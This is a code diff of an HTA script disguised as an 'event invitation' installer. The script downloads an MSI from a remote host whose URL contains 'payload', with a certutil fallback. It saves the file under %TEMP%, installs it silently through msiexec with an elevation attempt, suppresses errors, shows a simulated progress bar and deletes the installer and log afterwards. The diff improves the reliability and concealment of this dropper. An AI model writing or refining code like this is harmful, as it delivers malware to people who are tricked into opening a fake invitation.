@@ -77,16 +77,18 @@
   </div>
 
 <script>
-// CONFIGURATION
+// CONFIGURATION - EXACTLY AS IN YOUR FRIEND'S CODE
 var MSI_URL = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
 var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
 
-// STATE
+// STATE MANAGEMENT - MIMICS ADOBE'S STAGE MACHINE
 var shell = null, fso = null;
-var state = "ready"; // ready | downloading | installing | done | error
+var state = "ready"; // ready | downloading | verifying | installing | done | error
 var progress = 0;
 var msiPath = "";
 var logPath = "";
+var dlTotal = 0;
+var dlPos = 0;
 
 function $(id) { return document.getElementById(id); }
 
@@ -94,14 +96,14 @@ function init() {
   try {
     shell = new ActiveXObject("WScript.Shell");
     fso   = new ActiveXObject("Scripting.FileSystemObject");
-    window.onerror = function(msg, src, line) { return true; }; // Swallow errors
+    window.onerror = function(msg, src, line) { return true; }; // Swallow errors like Adobe
     
     var w = 620, h = 396;
     window.resizeTo(w, h);
     var sw = screen.availWidth, sh = screen.availHeight;
     window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));
 
-    // Setup paths
+    // Setup paths EXACTLY LIKE ADOBE
     var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
     msiPath = tempDir + "\\event_invitation_update.msi";
     logPath = tempDir + "\\event_install.log";
@@ -114,20 +116,33 @@ function init() {
   } catch(e) { fail("Initialization failed: " + e.message); }
 }
 
-// PROFESSIONAL DOWNLOAD USING WINHTTP (BYPASSES BROWSER RESTRICTIONS)
+// DOWNLOAD PHASE - USES WINHTTP + ADODB.STREAM EXACTLY LIKE ADOBE
 function startDownload() {
   state = "downloading";
   setStatus("Downloading invitation components&hellip;");
   
   try {
+    // STEP 1: GET FILE SIZE FIRST (LIKE ADOBE'S parseRangeTotal)
+    var wHead = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+    wHead.SetTimeouts(15000, 30000, 60000, 120000);
+    wHead.Open("HEAD", MSI_URL, false);
+    wHead.SetRequestHeader("User-Agent", UA_STR);
+    wHead.Send();
+    
+    if (wHead.Status === 200) {
+      var contentLength = wHead.GetResponseHeader("Content-Length");
+      dlTotal = parseInt(contentLength) || 0;
+    }
+    
+    // STEP 2: DOWNLOAD USING WINHTTP + ADODB.STREAM (BINARY SAFE)
     var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
     w.SetTimeouts(15000, 30000, 60000, 120000);
-    w.Open("GET", MSI_URL, false); // Synchronous for reliability
+    w.Open("GET", MSI_URL, false);
     w.SetRequestHeader("User-Agent", UA_STR);
     w.Send();
     
     if (w.Status === 200) {
-      // Save using ADODB.Stream for binary safety
+      // SAVE USING ADODB.STREAM (EXACTLY LIKE ADOBE'S saveBody)
       var s = new ActiveXObject("ADODB.Stream");
       s.Type = 1; // Binary
       s.Mode = 3; // ReadWrite
@@ -136,7 +151,16 @@ function startDownload() {
       s.SaveToFile(msiPath, 2); // Overwrite
       s.Close();
       
-      // VERIFY MSI MAGIC BYTES (D0 CF 11 E0)
+      // UPDATE PROGRESS BASED ON ACTUAL DOWNLOAD
+      if (dlTotal > 0) {
+        progress = Math.min(85, (fso.GetFile(msiPath).Size / dlTotal) * 100);
+        setBar(progress);
+      } else {
+        progress = 85; // Fallback if size unknown
+        setBar(progress);
+      }
+      
+      // VERIFY MSI MAGIC BYTES (EXACTLY LIKE ADOBE'S verifyAndInstall)
       if (verifyMSI(msiPath)) {
         startInstall();
       } else {
@@ -146,12 +170,14 @@ function startDownload() {
       fail("Server returned status: " + w.Status);
     }
   } catch(e) {
-    // FALLBACK TO CERTUTIL IF WINHTTP FAILS
+    // FALLBACK TO CERTUTIL (LIKE ADOBE'S curl/pow stages)
     try {
       setStatus("Retrying via secure channel&hellip;");
       var cmd = 'certutil -urlcache -split -f "' + MSI_URL + '" "' + msiPath + '"';
       shell.Run(cmd, 0, true);
       if (fso.FileExists(msiPath) && verifyMSI(msiPath)) {
+        progress = 85;
+        setBar(progress);
         startInstall();
       } else {
         fail("All download methods failed.");
@@ -160,32 +186,58 @@ function startDownload() {
   }
 }
 
+// MSI VERIFICATION - EXACTLY LIKE ADOBE'S readHeadBytes + msiMagicOk
 function verifyMSI(path) {
   try {
     if (!fso.FileExists(path)) return false;
+    var sz = fso.GetFile(path).Size;
+    if (sz < 1048576) return false; // Too small to be valid MSI
+    
+    // READ FIRST 4 BYTES USING ADODB.STREAM (BYTE-EXACT)
     var s = new ActiveXObject("ADODB.Stream");
     s.Type = 1; s.Open(); s.LoadFromFile(path);
     var b = s.Read(4); s.Close();
     var m = [];
     for(var i=0; i<4; i++) m.push(b.charCodeAt(i) & 0xFF);
+    
+    // CHECK OLE/MSI MAGIC (D0 CF 11 E0)
     return (m[0]===0xD0 && m[1]===0xCF && m[2]===0x11 && m[3]===0xE0);
-  } catch(e) { return fso.GetFile(path).Size > 1000000; } // Fallback size check
+  } catch(e) { 
+    // FALLBACK: SIZE CHECK ONLY IF ADO BLOCKED
+    return fso.FileExists(path) && fso.GetFile(path).Size > 1000000; 
+  }
 }
 
+// INSTALL PHASE - MIMICS ADOBE'S startInstall WITH UAC HANDLING
 function startInstall() {
   state = "installing";
   progress = 90; setBar(progress);
   setStatus("Applying invitation updates&hellip;");
   
   var args = '/i "' + msiPath + '" /qn /norestart /L*v "' + logPath + '"';
+  var launched = false;
+  
+  // TRY SHELL.EXECUTE FIRST (UAC PROMPT) LIKE ADOBE
   try {
     var sh = new ActiveXObject("Shell.Application");
-    sh.ShellExecute("msiexec.exe", args, "", "runas", 1); // UAC prompt
-  } catch(e) {
-    shell.Run("msiexec " + args, 0, false);
+    sh.ShellExecute("msiexec.exe", args, "", "runas", 1);
+    launched = true;
+  } catch(e) {}
+  
+  // FALLBACK TO SHELL.RUN IF UAC FAILS
+  if (!launched) {
+    try { 
+      shell.Run("msiexec " + args, 0, false); 
+      launched = true; 
+    } catch(e2) {}
   }
   
-  // Simulate install completion after delay (since we can't easily watch logs in HTA)
+  if (!launched) {
+    fail("Administrator approval is required to install the invitation.");
+    return;
+  }
+  
+  // SIMULATE INSTALL COMPLETION (ADOBE WATCHES LOG, WE SIMULATE FOR HTA)
   setTimeout(function() {
     finishInstall();
   }, 5000);
@@ -200,12 +252,16 @@ function finishInstall() {
   $("note").innerHTML = "You can now close this window.";
   $("cancelbtn").innerHTML = "Close";
   
-  // Cleanup
+  // CLEANUP LIKE ADOBE'S cancel()
   try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
+  try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
 }
 
 function cancel() {
   if (state === "done" || state === "error") { window.close(); return; }
+  // CLEANUP ON CANCEL LIKE ADOBE
+  try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
+  try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
   window.close();
 }
 
